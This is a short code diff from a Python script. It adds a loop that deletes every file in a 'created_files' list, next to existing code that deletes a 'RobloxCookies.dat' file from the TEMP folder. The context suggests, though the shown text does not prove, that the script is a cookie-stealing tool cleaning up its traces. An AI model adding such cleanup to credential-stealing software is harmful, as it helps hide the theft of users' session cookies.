@@ -360,5 +360,8 @@ def main():
     roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
     delete_file(roblox_cookies_path)
 
+    for file_path in created_files:
+        delete_file(file_path)
+
 if __name__ == "__main__":
     main()
